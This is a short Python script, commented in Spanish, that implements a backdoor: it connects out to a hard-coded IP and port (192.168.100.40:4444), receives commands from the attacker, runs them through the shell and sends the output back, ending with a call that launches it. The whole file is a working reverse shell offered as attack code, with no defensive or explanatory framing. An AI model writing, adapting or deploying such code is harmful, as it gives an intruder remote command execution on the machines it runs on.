import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def ejecutar_comando(self, command): #Ejecuta el comando que envia el atacante
        return subprocess.check_output(command, shell=True) #Ejecuta el comando que envia el atacante
    
    def run(self):
        while True:
            command=self.reliable_recive() #Obtiene el comando escrito por el atacante
            if command[0] == "salir":
                self.connection.close()
                exit()
            resultados_comando = self.ejecutar_comando(command) #Se guardan lso resultados obtenidos
            self.reliable_send(resultados_comando) #Envia lo obtenido en pantalla al ejecutar el comando del atacante
        
puerta  = Backdoor("192.168.100.40", 4444) #Direccion ip del servidor a donde van los datos
puerta.run()